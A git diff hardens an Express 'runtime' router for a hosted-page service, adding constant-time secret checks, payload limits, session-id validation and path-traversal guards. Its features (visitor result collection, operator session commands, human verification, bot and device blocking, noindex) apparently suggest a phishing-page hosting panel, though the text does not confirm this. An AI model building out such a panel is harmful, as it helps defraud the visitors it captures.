@@ -1,4 +1,5 @@
 import { Router } from "express";
+import { timingSafeEqual } from "node:crypto";
 import {
   findPackage,
   getSessionCommand,
@@ -24,6 +25,22 @@ import { deviceBlocked } from "../services/deviceRules.js";
 
 export const runtimeRouter = Router();
 
+const runtimePayloadLimits = {
+  config: 8 * 1024,
+  security: 16 * 1024,
+  traffic: 24 * 1024,
+  result: 96 * 1024,
+  command: 8 * 1024,
+  verify: 16 * 1024
+};
+
+runtimeRouter.use((req, res, next) => {
+  res.setHeader("Cache-Control", "no-store");
+  res.setHeader("X-Content-Type-Options", "nosniff");
+  res.setHeader("X-Robots-Tag", "noindex, nofollow");
+  next();
+});
+
 function requestIp(req) {
   return req.headers["cf-connecting-ip"]
     || req.headers["x-forwarded-for"]?.split(",")[0]?.trim()
@@ -38,6 +55,33 @@ function normalizeHost(value = "") {
     .replace(/^https?:\/\//, "")
     .replace(/\/.*$/, "")
     .replace(/:\d+$/, "");
+}
+
+function runtimeError(res, status, error, detail = {}) {
+  res.status(status).json({ error, ...detail });
+  return null;
+}
+
+function safeCompare(value, expected) {
+  const a = Buffer.from(String(value || ""));
+  const b = Buffer.from(String(expected || ""));
+  if (a.length !== b.length) return false;
+  return timingSafeEqual(a, b);
+}
+
+function payloadTooLarge(req, res, limit) {
+  const size = Buffer.byteLength(JSON.stringify(req.body || {}), "utf8");
+  if (size <= limit) return false;
+  runtimeError(res, 413, "Runtime payload too large", { limit });
+  return true;
+}
+
+function runtimeIdFrom(req) {
+  return String(req.body?.userPageId || req.query?.userPageId || req.body?.pageId || req.query?.pageId || "").trim();
+}
+
+function validSessionId(value = "") {
+  return /^[a-z0-9_.:-]{0,96}$/i.test(String(value || ""));
 }
 
 function relaySecretFor(page) {
@@ -77,8 +121,8 @@ function publicPageConfig(page) {
       domains: allowedHostsFor(page),
       captcha: Boolean(security.captcha),
       turnstile: publicTurnstileConfig(security),
-      bannedIps: security.bannedIps || [],
-      whitelistIps: security.whitelistIps || [],
+      bannedIpCount: (security.bannedIps || []).length,
+      whitelistIpCount: (security.whitelistIps || []).length,
       blockedDevices: security.blockedDevices || []
     },
     resultSettings: page.resultSettings || {},
@@ -89,41 +133,49 @@ function publicPageConfig(page) {
 }
 
 async function runtimeContext(req, res) {
-  const userPageId = req.body?.userPageId || req.query?.userPageId || req.body?.pageId || req.query?.pageId;
+  const userPageId = runtimeIdFrom(req);
+  if (!userPageId || userPageId.length > 120) {
+    return runtimeError(res, 400, "Runtime page id required");
+  }
   const page = await resolveUserPageSubscription(userPageId);
   if (!page) {
-    res.status(404).json({ error: "Runtime page not found" });
-    return null;
+    return runtimeError(res, 404, "Runtime page not found");
   }
 
   const expectedSecret = relaySecretFor(page);
-  const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret || req.query?.relaySecret;
-  if (expectedSecret && providedSecret !== expectedSecret) {
-    res.status(403).json({ error: "Relay secret rejected" });
-    return null;
+  const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret;
+  if (expectedSecret && !safeCompare(providedSecret, expectedSecret)) {
+    return runtimeError(res, 403, "Relay secret rejected");
   }
 
   const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
   const allowedHosts = allowedHostsFor(page);
+  if (allowedHosts.length && !clientHost) {
+    return runtimeError(res, 403, "Runtime host required");
+  }
   if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
-    res.status(403).json({ error: "Domain not authorized", host: clientHost });
-    return null;
+    return runtimeError(res, 403, "Domain not authorized", { host: clientHost });
   }
 
   const subscriptionState = pageSubscriptionState(page);
   if (subscriptionState.blocked) {
-    res.status(402).json({
-      error: subscriptionState.status,
+    return runtimeError(res, 402, subscriptionState.status, {
       reason: subscriptionState.status === "payment_failed"
         ? "Page subscription renewal failed. Fund wallet or renew manually."
         : "Page subscription expired. Renew from wallet to restore access.",
       userPageId: page.id,
       renewalDate: page.subscription?.renewalDate || null
     });
-    return null;
   }
 
   return { page, clientHost, ip: requestIp(req) };
+}
+
+function enforceRuntimeSecurity(context, req, res) {
+  const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
+  if (decision.allowed) return decision;
+  runtimeError(res, 403, "Runtime blocked", { reason: decision.reason, deviceType: decision.deviceType || null });
+  return null;
 }
 
 function securityDecision(page, ip, userAgent = "") {
@@ -235,12 +287,21 @@ async function packageForRuntimePage(page) {
 async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   const context = await runtimeContext(req, res);
   if (!context) return;
+  if (!enforceRuntimeSecurity(context, req, res)) return;
 
   const pagePackage = await packageForRuntimePage(context.page);
   const requestedFile = String(req.query?.file || "");
   const file = requestedFile || previewFileForPackage(pagePackage);
+  if (file.includes("..") || file.length > 240) {
+    res.status(400).send("Invalid package file");
+    return;
+  }
   if (!file || !packageContainsFile(pagePackage, file)) {
     res.status(404).send("Package file not found");
+    return;
+  }
+  if (asAsset && /\.html?$/i.test(file)) {
+    res.status(404).send("Package asset not found");
     return;
   }
 
@@ -249,14 +310,14 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   if (asAsset || !/\.html?$/i.test(file)) {
     const buffer = Buffer.from(await response.arrayBuffer());
     res.setHeader("Content-Type", contentTypeFor(file));
-    res.setHeader("Cache-Control", "private, max-age=60");
+    res.setHeader("Cache-Control", "no-store");
     res.send(buffer);
     return;
   }
 
   const html = await response.text();
   res.setHeader("Content-Type", "text/html; charset=utf-8");
-  res.setHeader("Cache-Control", "private, max-age=60");
+  res.setHeader("Cache-Control", "no-store");
   res.setHeader("X-Robots-Tag", "noindex, nofollow");
   res.send(rewriteRuntimeHtml(html, { userPageId: context.page.id, file }));
 }
@@ -264,12 +325,15 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
 runtimeRouter.get("/config", async (req, res) => {
   const context = await runtimeContext(req, res);
   if (!context) return;
+  if (!enforceRuntimeSecurity(context, req, res)) return;
   res.json({ config: publicPageConfig(context.page) });
 });
 
 runtimeRouter.post("/config", async (req, res) => {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.config)) return;
   const context = await runtimeContext(req, res);
   if (!context) return;
+  if (!enforceRuntimeSecurity(context, req, res)) return;
   res.json({ config: publicPageConfig(context.page) });
 });
 
@@ -277,7 +341,8 @@ runtimeRouter.get("/source", async (req, res) => {
   try {
     await sendRuntimePackageFile(req, res);
   } catch (error) {
-    res.status(400).send(String(error.message || error));
+    console.warn("Runtime source failed:", error.message);
+    res.status(400).send("Runtime source unavailable");
   }
 });
 
@@ -285,11 +350,13 @@ runtimeRouter.get("/source/asset", async (req, res) => {
   try {
     await sendRuntimePackageFile(req, res, { asAsset: true });
   } catch (error) {
-    res.status(404).send(String(error.message || error));
+    console.warn("Runtime asset failed:", error.message);
+    res.status(404).send("Runtime asset unavailable");
   }
 });
 
 runtimeRouter.post("/security/check", async (req, res) => {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.security)) return;
   const context = await runtimeContext(req, res);
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
@@ -297,6 +364,7 @@ runtimeRouter.post("/security/check", async (req, res) => {
 });
 
 runtimeRouter.post("/verify-human", async (req, res) => {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.verify)) return;
   const context = await runtimeContext(req, res);
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
@@ -323,6 +391,7 @@ runtimeRouter.post("/verify-human", async (req, res) => {
 });
 
 runtimeRouter.post("/traffic", async (req, res) => {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.traffic)) return;
   const context = await runtimeContext(req, res);
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
@@ -341,18 +410,22 @@ runtimeRouter.get("/session-command", async (req, res) => {
   const context = await runtimeContext(req, res);
   if (!context) return;
   const sessionId = req.query?.sessionId || req.body?.sessionId;
+  if (!validSessionId(sessionId)) return runtimeError(res, 400, "Invalid session id");
   const result = await getSessionCommand(context.page.id, sessionId);
   res.json(result || { command: null });
 });
 
 runtimeRouter.post("/session-command", async (req, res) => {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.command)) return;
   const context = await runtimeContext(req, res);
   if (!context) return;
+  if (!validSessionId(req.body?.sessionId)) return runtimeError(res, 400, "Invalid session id");
   const result = await getSessionCommand(context.page.id, req.body?.sessionId);
   res.json(result || { command: null });
 });
 
 runtimeRouter.post("/results", async (req, res) => {
+  if (payloadTooLarge(req, res, runtimePayloadLimits.result)) return;
   const context = await runtimeContext(req, res);
   if (!context) return;
   const decision = securityDecision(context.page, context.ip, req.headers["user-agent"]);
